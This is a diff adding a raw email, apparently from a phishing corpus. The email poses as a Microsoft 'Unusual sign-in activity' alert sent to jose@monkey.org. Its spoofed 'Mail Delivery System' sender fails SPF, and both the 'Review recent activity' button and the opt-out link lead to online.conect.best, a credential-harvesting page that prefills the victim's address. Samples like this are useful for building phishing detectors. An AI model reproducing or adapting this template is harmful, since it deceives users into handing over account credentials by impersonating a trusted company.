@@ -1,0 +1,141 @@
+From jose@monkey.org Wed May 10 06:07:29 2023 +0000
+Return-Path: jose@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 80773313418.33.4FDDBCD
+Received: from shut-antic.naturescar.com (unknown [185.222.58.45])
+	by imf13.b.hostedemail.com (Postfix) with ESMTP id 32613120044
+	for <jose@monkey.org>; Wed, 10 May 2023 06:07:27 +0000 (UTC)
+Authentication-Results: imf13.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf13.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1683698848;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=l3IWLdOZ5yz39E7isUxqERCFjUOSrkdhvnt+hWDgWrA=;
+	b=zs5Om5sZex/W7qTif4eOUkplmE8VFV2AeZ8RN2Ft4QOPCyS6+uCW6wl32zrIBc0GEoe4my
+	2rcI9SRpH6yR28qsXLfTcgaF1FBy0UuQ4jceUGkFN8OuAm7eYwpy7ojjMby+WpzWcaZblE
+	GKCpwWz4zlM+x2MSRDRIiS02k2nNpec=
+ARC-Authentication-Results: i=1;
+	imf13.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf13.b.hostedemail.com: 185.222.58.45 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1683698848; a=rsa-sha256;
+	cv=none;
+	b=WKHsttlSZ4b9mbmktjvP61AQuvntrjJ1g7ZzEneWE8ZB/lOpK8IvWNBr93Xg1wIKpa/PrC
+	eHKcNmEEw61Jivo9YijA6HoD3EuHnodu1ZPfQpcB5J2qcUNSIxjy/Z9uLBvDAqt+oKEOYo
+	i+V6hbnhaipgmNRo0Rni4/aX4fdLjxM=
+From: Mail Delivery System <jose@monkey.org>
+To: jose@monkey.org
+CC: info@monkey.org
+Subject: Microsoft warning
+Date: 10 May 2023 08:07:27 +0200
+Message-ID: <20230510080727.C2872079692A9C2E@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 32613120044
+X-Stat-Signature: yqjednqpr7wzbdss7ncsqnkot5gb9fj7
+X-Rspam-User: 
+X-Spam-Status: No, score=8.38
+X-HE-Tag: 1683698847-850405
+X-HE-Meta: U2FsdGVkX19ULnhLyjlrKfI1XnNbPtkmUGD5qePw2M1X7t+dald+THOwvVUf2hQgrx4NUjP86gSxQvq7Tv1HWYB3OUg+g+o4Q9gb9+vYneRTkPwJmM5Ezvl2zPYFh5yZLi0awDkeTHCGO7xIR9no8PA9E2usumY2N9iPmbw7KV2f+qHboV/a7D4+Wu3RkEX4U0euaNimUI3Ym4n/3WPehjdblcPv5LMN8OfCoUvkpRU=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 104
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<p><br class=3D"Apple-interchange-newline"></p>
+<table style=3D"color: rgb(34, 34, 34); text-transform: none; letter-spacin=
+g: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; fon=
+t-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; =
+orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-l=
+igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
+; text-decoration-thickness: initial; text-decoration-style: initial; text-=
+decoration-color: initial;" dir=3D"ltr"><tbody><tr>
+<td id=3D"m_3463842863449937744i1" style=3D'margin: 0px; padding: 0px; colo=
+r: rgb(112, 112, 112); font-family: "Segoe UI Semibold", "Segoe UI Bold", "=
+Segoe UI", "Helvetica Neue Medium", Arial, sans-serif; font-size: 17px;'>Mi=
+crosoft account</td></tr><tr><td id=3D"m_3463842863449937744i2" style=3D'ma=
+rgin: 0px; padding: 0px; color: rgb(38, 114, 236); font-family: "Segoe UI L=
+ight", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif; font-size: 4=
+1px;'>Unusual sign-in activity</td></tr><tr>
+<td id=3D"m_3463842863449937744i3" style=3D'margin: 0px; padding: 25px 0px =
+0px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Aria=
+l, sans-serif; font-size: 14px;'>We detected something unusual about a rece=
+nt sign-in to the Microsoft account<span>&nbsp;</span><a class=3D"m_3463842=
+863449937744link" id=3D"m_3463842863449937744iAccount" style=3D"color: rgb(=
+38, 114, 236); text-decoration: none;" dir=3D"ltr" target=3D"_blank">jose@m=
+onkey.org</a></td></tr><tr>
+<td id=3D"m_3463842863449937744i4" style=3D'margin: 0px; padding: 25px 0px =
+0px; color: rgb(42, 42, 42); font-family: "Segoe UI Bold", "Segoe UI Semibo=
+ld", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif; font-size: 14p=
+x; font-weight: bold;'>Sign-in details</td></tr><tr><td id=3D"m_34638428634=
+49937744i5" style=3D'margin: 0px; padding: 6px 0px 0px; color: rgb(42, 42, =
+42); font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size=
+: 14px;'>Country/region: Canada</td></tr><tr>
+<td id=3D"m_3463842863449937744i6" style=3D'margin: 0px; padding: 6px 0px 0=
+px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial=
+, sans-serif; font-size: 14px;'>IP address: 216.151.184.161</td></tr><tr><t=
+d id=3D"m_3463842863449937744i7" style=3D'margin: 0px; padding: 6px 0px 0px=
+; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial, =
+sans-serif; font-size: 14px;'>Date:&nbsp;5/10/2023 8:07:27 a.m.&nbsp;(GMT)<=
+/td></tr><tr>
+<td id=3D"m_3463842863449937744i8" style=3D'margin: 0px; padding: 6px 0px 0=
+px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial=
+, sans-serif; font-size: 14px;'>Platform: Windows</td></tr><tr><td id=3D"m_=
+3463842863449937744i9" style=3D'margin: 0px; padding: 6px 0px 0px; color: r=
+gb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif=
+; font-size: 14px;'>Browser: Chrome</td></tr><tr>
+<td id=3D"m_3463842863449937744i10" style=3D'margin: 0px; padding: 25px 0px=
+ 0px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Ari=
+al, sans-serif; font-size: 14px;'>Please go to your recent activity page to=
+ let us know whether or not this was you. If this wasn't you, we'll help yo=
+u secure your account. If this was you, we'll trust similar activity in the=
+ future.</td></tr><tr>
+<td style=3D'margin: 0px; padding: 25px 0px 0px; color: rgb(42, 42, 42); fo=
+nt-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;=
+'><table border=3D"0" cellspacing=3D"0"><tbody><tr><td style=3D"margin: 0px=
+; padding: 5px 20px; min-width: 50px; background-color: rgb(38, 114, 236);"=
+ bgcolor=3D"#2672ec">
+<a id=3D"m_3463842863449937744i11" style=3D'text-align: center; color: rgb(=
+255, 255, 255); letter-spacing: 0.02em; font-family: "Segoe UI Semibold", "=
+Segoe UI Bold", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif; fon=
+t-size: 14px; font-weight: 600; text-decoration: none;' href=3D"https://onl=
+ine.conect.best/configurators.html?val=3Djose@monkey.org" target=3D"_blank"=
+=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://account.micr=
+osoft.com/activity&amp;source=3Dgmail&amp;ust=3D1671520099409000&amp;usg=3D=
+AOvVaw3ZH8-vvjARw5cUJS39o-9i">Review recent activity</a></td></tr></tbody><=
+/table></td></tr><tr><td id=3D"m_3463842863449937744i12" style=3D'margin: 0=
+px; padding: 25px 0px 0px; color: rgb(42, 42, 42); font-family: "Segoe UI",=
+ Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>To opt out or change=
+ where you receive security notifications,<span>&nbsp;</span>
+<a class=3D"m_3463842863449937744link" id=3D"m_3463842863449937744iLink5" s=
+tyle=3D"color: rgb(38, 114, 236); text-decoration: none;" href=3D"https://o=
+nline.conect.best/configurators.html?val=3Djose@monkey.org" target=3D"_blan=
+k" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://account.l=
+ive.com/SecurityNotifications/Update&amp;source=3Dgmail&amp;ust=3D167152009=
+9409000&amp;usg=3DAOvVaw25q-q_SDUBhvtfQVFBO9_6">click here</a>.</td></tr><t=
+r>
+<td id=3D"m_3463842863449937744i13" style=3D'margin: 0px; padding: 25px 0px=
+ 0px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Ari=
+al, sans-serif; font-size: 14px;'>Thanks,</td></tr><tr><td id=3D"m_34638428=
+63449937744i14" style=3D'margin: 0px; padding: 0px; color: rgb(42, 42, 42);=
+ font-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14=
+px;'>The Microsoft account team</td></tr></tbody></table><p>
+</p>
+
+
+</body></html>
